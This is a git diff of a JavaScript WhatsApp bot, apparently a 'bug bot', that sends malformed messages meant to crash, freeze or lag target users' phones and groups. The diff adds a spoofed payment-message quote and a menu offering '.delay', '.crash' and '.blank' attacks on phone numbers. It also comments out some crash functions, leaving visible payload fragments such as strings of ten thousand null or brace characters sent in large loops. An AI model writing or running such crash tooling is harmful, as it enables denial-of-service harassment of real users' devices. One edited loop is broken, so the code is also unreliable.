@@ -233,6 +233,80 @@ if (command) {
   }
 }
 
+const rnp = {
+    key: {
+        fromMe: false,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "status@broadcast"
+    },
+    message: {
+        interactiveMessage: {
+            header: {
+                hasMediaAttachment: true,
+                jpegThumbnail: fs.readFileSync('./System/Thumbnail.jpg')
+            },
+            nativeFlowMessage: {
+                buttons: [
+                    {
+                        name: "review_and_pay",
+                        buttonParamsJson: JSON.stringify({
+                            currency: "IDR",
+                            payment_configuration: "",
+                            payment_type: "",
+                            total_amount: { value: 72050000, offset: 100 },
+                            reference_id: "X",
+                            type: "physical-goods",
+                            order: {
+                                status: "preparing_to_ship",
+                                description: "",
+                                subtotal: { value: 72050000, offset: 100 },
+                                order_type: "ORDER",
+                                items: [
+                                    {
+                                        retailer_id: "25127408720248432",
+                                        product_id: "25127408720248432",
+                                        name: "ZaxUniver - WaBot",
+                                        amount: { value: 72050000, offset: 100 },
+                                        quantity: 1
+                                    }
+                                ]
+                            },
+                            additional_note: "",
+                            native_payment_methods: [],
+                            share_payment_status: false
+                        })
+                    }
+                ]
+            }
+        }
+    }
+};
+
+// Fungsi Reply (UPDATE quoted: rnp)
+const Replyzax = (teks) => {
+    return zax.sendMessage(
+        m.chat,
+        {
+            text: teks,
+            contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 99999999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: "#universqlnject",
+                    body: "© azaxm",
+                    mediaType: 1,
+                    renderLargerThumbnail: false,
+                    showAdAttribution: false,
+                    thumbnailUrl: "https://daffa-dev.my.id/upload/oaiko.jpg",
+                    sourceUrl: ""
+                }
+            }
+        },
+        { quoted: rnp }  // <-- GANTI zets JADI rnp
+    );
+};
+
 //FUNCTION
 async function freeze(target, Ptcp = true) {
   try {
@@ -885,7 +959,7 @@ async function delay6(zax, target) {
 
   console.log(chalk.red(`Succes send bug delay to ${target} by akira`))
 }
-async function crashblank1(target) {
+/*async function crashblank1(target) {
   await zax.relayMessage(
     target,
     {
@@ -960,9 +1034,8 @@ async function crashblank1(target) {
       participant: { jid: target },
     }
   );
-}
-
-async function blankcrash1(target) {
+}*/
+/*async function blankcrash1(target) {
   try {
     const loopNya = 500;
     const Cards = 20;
@@ -970,7 +1043,7 @@ async function blankcrash1(target) {
     for (let i = 0; i < loopNya; i++) {
       let cards = [];
 
-      for (let j = 0; j < Cards; j++) {
+       for (let i = 0; j < Cards; j++) {
         cards.push({
           body: { text: "\u0000".repeat(10000) },
           footer: { text: "" },
@@ -1031,7 +1104,7 @@ async function blankcrash1(target) {
   } catch (err) {
     console.error("❌ Error di:", err);
   }
-}
+}*/
 
 async function crashblank(target, ptcp = false) {
   try {
@@ -1106,7 +1179,7 @@ async function crashblank(target, ptcp = false) {
 }
 
 
-async function blankcrash(target) {
+/*async function blankcrash(target) {
   for (let r = 0; r < 1; r++) {
     try {
     const space = "{".repeat(10000);
@@ -1253,7 +1326,7 @@ async function blankcrash(target) {
   }
 }
 }
-
+*/
 async function delay5(target)  {
    const album = await generateWAMessageFromContent(target, {
       albumMessage: {
@@ -1925,7 +1998,7 @@ return arr[Math.floor(Math.random() * arr.length)]
 }
 switch(command) {
 //ALL MENU CASE {
-case 'menu': {
+/*case 'menu': {
 await zax.sendMessage(m.chat, {
   interactiveMessage: {
      title: `─ Hello ${m.pushName}, My Name is zax-berse, I am an Automated Bot That Works To Help 
@@ -2086,7 +2159,169 @@ await zax.sendMessage(m.chat, {
         }
     }, { quoted: zets });
     break 
+}*/
+case 'menu': {
+    await zax.sendMessage(m.chat, {
+        interactiveMessage: {
+            title: `─ Hello ${m.pushName}, My Name is zax-berse, I am an Automated Bot That Works To Help 
+
+─ ! Information
+- bots name : sql-exp 
+- Creator : azaxm
+- Contact dvp : t.me/zaxsql | t.me/nanastfx
+- Channels : https://t.me/universql
+- Version : 1.0
+- Runtime : ${runtime(process.uptime())}
+
+─ ! Bug Menu
+- .delay 62××
+- .crash 62××
+- .blank 62××
+
+─ ! Bug Group
+- .crash-gb https or id
+- .swgroup <id>
+
+─ ! Owner menu
+- .addown ( 62××× )
+- .delown ( 62××× )
+- .addprem ( 62××× )
+- .delprem ( 62××× )
+- .public
+- .self 
+`, 
+            footer: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀᴢᴀxᴍ",
+            image: { url: './System/Thumbnail.jpg' },
+            nativeFlowMessage: {
+                messageParamsJson: JSON.stringify({
+                    limited_time_offer: {
+                        text: "ᴢᴀx-ᴠᴇʀsᴇ",
+                        url: "t.me/universql",
+                        copy_code: "#about me ambatuzkam",
+                        expiration_time: Date.now() + 86400000
+                    },
+                    bottom_sheet: {
+                        in_thread_buttons_limit: 2, 
+                        divider_indices: [1, 2, 3, 4, 5, 999],
+                        list_title: "#zax-verse",
+                        button_title: "</>"
+                    },
+                    tap_target_configuration: {
+                        title: " X ",
+                        description: "bomboclard",
+                        canonical_url: "https://t.me/universql",
+                        domain: "id.wwbs.net",
+                        button_index: 0
+                    }
+                }),
+                buttons: [
+                    {
+                        name: "single_select",
+                        buttonParamsJson: JSON.stringify({
+                            title: "𝕬𝖑𝖑 𝕸𝖊𝖓𝖚",
+                            sections: [
+                                {
+                                    title: "𝕭𝖚𝖌𝖘 𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕",
+                                    highlight_label: "⚠️",
+                                    rows: [
+                                        {
+                                            title: "ḑ̴̞͛̒ẹ̿͋̒̕l̙͖̑̾ͣā̤̓̍͘y҉̃̀̋̑",
+                                            description: "delay",
+                                            id: ".delay"
+                                        },
+                                        {
+                                            title: "B̩͎͍̾ͅl̙͖̑̾ͣā̤̓̍͘ṇ̤͛̒̍ḳ̯͍̑ͦ ā̤̓̍͘ṇ̤͛̒̍ḑ̴̞͛̒r̴̨̦͕̝o̯̱̊͊͢",
+                                            description: "Blank",
+                                            id: ".blank"
+                                        },
+                                        {
+                                            title: "c͕͗ͤ̕c͕͗ͤ̕̕r̴̨̦͕̝ā̤̓̍͘s̠҉͍͊ͅḣ̖̻͛̓",
+                                            description: "crash ui for andro and iphone",
+                                            id: ".crash"
+                                        }
+                                    ]
+                                },
+                                {
+                                    title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
+                                    highlight_label: "only own",
+                                    rows: [
+                                        {
+                                            title: "➕ Add Owner",
+                                            description: "Tambah owner baru",
+                                            id: ".ddowner"
+                                        },
+                                        {
+                                            title: "➖ Del Owner",
+                                            description: "Hapus owner",
+                                            id: ".delowner"
+                                        },
+                                        {
+                                            title: "💎 Add Premium",
+                                            description: "Tambah user premium",
+                                            id: ".addprem"
+                                        },
+                                        {
+                                            title: "❌ Del Premium",
+                                            description: "Hapus user premium",
+                                            id: ".delprem"
+                                        },
+                                        {
+                                            title: "🌍 Public Mode",
+                                            description: "Set bot ke mode public",
+                                            id: ".public"
+                                        },
+                                        {
+                                            title: "🔒 Self Mode",
+                                            description: "Set bot ke mode self",
+                                            id: ".self"
+                                        }
+                                    ]
+                                },
+                                {
+                                    title: "🛠️ TOOLS MENU",
+                                    highlight_label: "🔧",
+                                    rows: [
+                                        {
+                                            title: "ᴇᴠᴀʟ",
+                                            description: "",
+                                            id: ".eval"
+                                        },
+                                        {
+                                            title: "ɪɴғᴏ",
+                                            description: "",
+                                            id: "info"
+                                        },
+                                        {
+                                            title: "Sw Grup",
+                                            description: "Post status ke grup",
+                                            id: ".swgc"
+                                        }
+                                    ]
+                                }
+                            ],
+                            has_multiple_buttons: true
+                        })
+                    },
+                    {
+                        name: "call_permission_request",
+                        buttonParamsJson: JSON.stringify({
+                            has_multiple_buttons: true
+                        })
+                    },
+                    {
+                        name: "cta_url",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: "📞 Contact!", 
+                            url: "https://t.me/zaxsql",
+                            merchant_url: "https://t.me/universql"
+                        })
+                    }
+                ]
+            }
+        }
+    }, { quoted: rnp });
 }
+    break;
 //=======================\\
 //===========case OwnMenu/Fun============\\
 case 'addowner': case 'addown':
@@ -2310,7 +2545,6 @@ case 'delay': {
 
     for (let r = 0; r < 10; r++) {
     await delay1(zax, target);
-    await delay2(zax, target);
     await delay3(zax, target);
     await delay4(zax, target);
     await delay5(target);
@@ -2341,10 +2575,7 @@ case 'blank': {
     Replyzax(`*Success! Send Bug to ${target}*`);
 
     for (let r = 0; r < 10; r++) {
-    await blankcrash(target);
     await crashblank(target, true);
-    await blankcrash1(target);
-    await crashblank1(target);
     await blankcrash2(target);
     await crashblank2(zax, target);
     await crashui(target, false);
@@ -2413,7 +2644,7 @@ case 'crash': {
     await freeze(target, false);
     await sleep(100)
     await loc(target);
-    await sleep(100)*
+    await sleep(100);
     }
   console.log(chalk.red.bold("Success!"))
 }
